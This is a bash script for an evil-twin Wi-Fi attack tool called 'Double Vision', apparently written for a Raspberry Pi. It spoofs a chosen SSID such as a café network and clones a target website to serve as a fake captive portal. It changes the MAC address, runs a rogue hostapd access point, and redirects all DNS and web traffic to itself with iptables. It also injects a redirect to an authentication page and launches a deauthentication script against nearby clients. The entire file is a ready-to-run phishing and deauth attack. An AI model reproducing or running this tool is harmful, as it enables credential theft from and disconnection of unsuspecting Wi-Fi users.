#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
 / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
 \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|

                            **Double Vision**

            A Wifi Hacking Tool For Evil Twin Captive Portals

                           Use At Your Own Risk
EOF
echo ""
echo -e ${green}"Which interface do you want to use as your AP NIC? Example: wlan1"${clear}
echo ""
read AP
echo""
echo -e ${yellow}"Using $AP as your AP interface"${clear}
echo ""
sleep 1
echo -e ${green}"Which interface do you want to use to deauth?"${clear}
echo ""
read DEAUTH
echo ""
echo -e ${yellow}"Bringing down $DEAUTH"${clear}
echo ""
sleep 1
echo -e ${green}"What is the Wifi network you want to spoof? Example: Starbucks Wifi"${clear}
echo ""
read SSID
echo ""
echo -e ${yellow}"Using $SSID as your spoofed network"${clear}
sleep 1
echo ""
echo -e ${green}"Enter Website URL To Clone. Example: https://starbucks.com"${clear}
echo ""
read URL
echo ""
echo -e ${yellow}"Cloning $URL"${clear}
echo ""
systemctl stop dnsmasq
cp Resources/hostapd.conf . 2>/dev/null
sed -i "s/AP/${AP}/g" hostapd.conf
sed -i "s/SSID/${SSID}/g" hostapd.conf
rm /etc/hostapd/hostapd.conf 2>/dev/null
cp hostapd.conf /etc/hostapd/hostapd.conf
/usr/bin/chromium-browser --no-sandbox 2>/dev/null
runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
echo ""
sleep 2
echo -e ${yellow}"$URL Cloned Successfully"${clear}
echo ""
sleep 1
echo -e ${green}"Moving Your Index.html File Into Apache"${clear}
echo ""
mv /home/pi/index.html /var/www/html/index.html
echo -e ${green}"Starting Apache"${clear}
service apache2 start
sleep 1
echo ""
echo -e ${green}"Changing $AP MAC Address"${clear}
echo ""
ifconfig $AP down
macchanger -A $AP
sleep 1
ifconfig $AP up
sleep 1
#echo -e ${green}"Starting DNS"${clear}
#systemctl start dnsmasq
echo ""
echo -e ${green}"Configuring $AP Into An Access Point"${clear}
echo ""
hostapd -B /etc/hostapd/hostapd.conf
sleep 2
echo ""
echo -e ${green}"Bringing Up The Bridge"${clear}
echo ""
ifconfig br0 up
sleep 2
ifconfig br0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
echo ""
echo -e ${green}"Copying Redirect Into Cloned Page"${clear}
echo ""
echo "<meta http-equiv="refresh" content=2;URL='http://10.1.1.1/authenticate.html'>">> /var/www/html/index.html
echo -e ${green}"Setting IPTables"${clear}
echo ""
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
iptables -t nat -A POSTROUTING -j MASQUERADE
sleep 2
echo ""
echo -e ${green}"Starting DNS"${clear}
service dnsmasq start
sleep 4
echo -e ${red}"Access Point Should Be Up. Time To Deauth"${clear}
echo ""
sleep 2
echo -e ${red}"Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"${clear}
echo ""
sleep 2
echo ""
read -p "Press enter once you understand how to disconnect from the TMUX session"
tmux new-session -s deauth 'cd PwrDeauther && sudo bash PwrDeauther.sh'
